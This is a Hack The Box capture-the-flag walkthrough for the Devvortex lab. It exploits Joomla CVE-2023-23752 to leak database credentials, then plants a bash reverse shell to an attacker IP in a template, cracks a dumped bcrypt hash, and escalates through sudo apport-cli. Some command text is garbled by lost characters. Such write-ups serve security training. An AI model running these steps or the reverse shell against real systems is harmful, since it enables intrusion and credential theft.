# Devortex

## HTB — Devvortex Writeup

**Difficulty:** Easy\
**OS:** Linux\
**CVE:** CVE-2023-23752 (Joomla! Unauthenticated Info Disclosure)\
**Attack Path:** Subdomain Enum → Joomla Info Leak → DB Creds → Reverse Shell → MySQL Hash Dump → SSH as User → apport-cli Privesc

### Overview

Devvortex is an easy Linux box running a Joomla CMS on a hidden subdomain. The box is vulnerable to **CVE-2023-23752**, which lets you pull database credentials from Joomla's API without any authentication. Those creds log you into the Joomla admin panel, where you inject a reverse shell into a template. From there it's a hop through MySQL to crack a bcrypt hash for SSH access, then a clean pport-cli sudo privesc to root.

### Enumeration

#### Nmap Scan

Target IP: 10.10.11.242

`ash nmap -T4 -A -v 10.10.11.242`

![Nmap Scan — Ports 22 and 80 Open](<../../.gitbook/assets/Unknown image (289)>)

**Open Ports:**

| Port | Service | Version              |
| ---- | ------- | -------------------- |
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu |
| 80   | HTTP    | nginx 1.18.0         |

Only two ports — SSH and a web server. Simple attack surface.

#### Subdomain Enumeration

Visiting 10.10.11.242 on port 80 redirects to devvortex.htb. Add it to /etc/hosts, then fuzz for subdomains:

`ash ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt \ -u http://devvortex.htb/ \ -H "Host: FUZZ.devvortex.htb" \ -mc 200`

![FFUF — dev.devvortex.htb Subdomain Found](<../../.gitbook/assets/Unknown image (290)>)

Found **dev.devvortex.htb** — add it to /etc/hosts too.

![dev.devvortex.htb — Devvortex Web App](<../../.gitbook/assets/Unknown image (291)>)

Visiting dev.devvortex.htb shows a corporate website. More importantly, navigating to /administrator/ reveals a **Joomla! admin login panel**.

![Joomla Administrator Login at dev.devvortex.htb/administrator/](<../../.gitbook/assets/Unknown image (292)>)

#### Joomla Version Check

Running joomscan against the dev subdomain:

![Joomscan — Joomla 4.2.6 Detected, robots.txt Exposed](<../../.gitbook/assets/Unknown image (293)>)

**Joomla version: 4.2.6** — this is directly vulnerable to **CVE-2023-23752**.

### Initial Access — CVE-2023-23752

#### The Vulnerability

CVE-2023-23752 is an **unauthenticated information disclosure** bug in Joomla versions 4.0.0–4.2.7. The /api/index.php/v1/config/application endpoint leaks the full application configuration — including the **database username and password** — without requiring any login.

`ash curl "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true"`

![CVE-2023-23752 — DB Credentials Leaked via Joomla API](<../../.gitbook/assets/Unknown image (294)>)

From the JSON response we get:

* **DB User:** lewis
* **DB Password:** P4ntherg0t1n5r3c0n##

#### Logging into Joomla Admin

Take those credentials straight to the Joomla admin panel at dev.devvortex.htb/administrator/.

![Joomla Admin Dashboard — Logged in as lewis (v4.2.6)](<../../.gitbook/assets/Unknown image (295)>)

We're in as lewis, the Joomla super admin.

#### Reverse Shell via Template Injection

In Joomla admin, go to **System → Templates → Administrator Templates → atum** and edit index.php. Add a one-liner reverse shell at the top of the file:

`php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'");`

![Joomla Template Editor — PHP Reverse Shell Injected into index.php](<../../.gitbook/assets/Unknown image (296)>)

Start a listener:

`ash nc -lvnp 4444`

Then trigger the shell by visiting any Joomla admin page. The template renders and the shell fires back.

![Shell Received as www-data — Upgrading with script/stty](<../../.gitbook/assets/Unknown image (297)>)

We land as **www-data**. Upgrade the shell:

`bash script /dev/null -c /bin/bash`

## Ctrl-Z

`stty raw -echo; fg export TERM=xterm`&#x20;

### Lateral Movement — www-data → logan

#### MySQL Database Dump

We already have the DB credentials from the API leak. Connect to MySQL:

`bash mysql -u lewis -p P4ntherg0t1n5r3c0n##`

![MySQL Login as lewis — Joomla Database](<../../.gitbook/assets/Unknown image (298)>)

`sql show databases; use joomla; show tables;`

![MySQL — Joomla DB Tables Listed](<../../.gitbook/assets/Unknown image (299)>)

Dump the users table:

`sql select username,password from sd4fg_users;`

![MySQL — bcrypt Hashes for lewis and logan](<../../.gitbook/assets/Unknown image (300)>)

Two hashes — one for lewis and one for logan. Let's crack logan's:

`/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12`

#### Cracking with John

`ash john loganhash --wordlist=rockyou.txt`

![John — logan Password Cracked: tequieromucho](<../../.gitbook/assets/Unknown image (301)>)

**Password:** equieromucho

#### SSH as logan

`ash ssh logan@devvortex.htb`

![SSH Login as logan — Ubuntu 20.04](<../../.gitbook/assets/Unknown image (302)>)

We're in as logan and can grab user.txt.

### Privilege Escalation — logan → root

#### Sudo Check

`ash sudo -l`

![sudo -l — logan Can Run apport-cli as Root](<../../.gitbook/assets/Unknown image (303)>)

logan can run /usr/bin/apport-cli as root with no password. This is the crash reporting tool in Ubuntu.

#### apport-cli Exploit

The trick: pport-cli opens crash reports in a pager (like less) when you use the -f flag with a log file. When less is open, you can escape to a shell with !sh.

`ash sudo /usr/bin/apport-cli test.log less -f`

![apport-cli — Crash Report Wizard Opened as Root](<../../.gitbook/assets/Unknown image (304)>)

Work through the prompts (select any option), and when the report opens in the less pager:

![apport-cli — less Pager Running as Root](<../../.gitbook/assets/Unknown image (305)>)

Type !sh or !/bin/bash while in the pager — this spawns a root shell.

\`ash

## In the pager type:

!/bin/bash \`

![Root Shell — root.txt Retrieved, Machine Pwned!](<../../.gitbook/assets/Unknown image (306)>)

We're root. Read the flag:

`bash cat /root/root.txt`

### Summary

| Step           | Detail                                                           |
| -------------- | ---------------------------------------------------------------- |
| Recon          | Nmap → ports 22 and 80                                           |
| Subdomain Fuzz | dev.devvortex.htb found with ffuf                                |
| Joomla         | Version 4.2.6 at /administrator/                                 |
| CVE-2023-23752 | Unauthenticated API leak → DB creds (lewis:P4ntherg0t1n5r3c0n##) |
| Admin Login    | Logged into Joomla as super admin                                |
| Reverse Shell  | PHP shell in atum template → www-data                            |
| MySQL          | Dumped Joomla users → bcrypt hash for logan                      |
| Hash Crack     | John + rockyou → equieromucho                                    |
| SSH            | Logged in as logan                                               |
| Privesc        | pport-cli sudo → less pager → !sh → root                        |

### Key Takeaways

* **Always fuzz subdomains** — the real attack surface here was hidden on dev.devvortex.htb
* **CVE-2023-23752** is a great reminder to keep CMS software updated — one public API endpoint leaking DB creds is game over
* **pport-cli + less** is a classic GTFOBins-style privesc — any program that opens a pager as root can be exploited with !sh
* Database passwords often reused or shared — always dump user tables from the DB once you have access

&#x20;_Platform: Hack The Box_
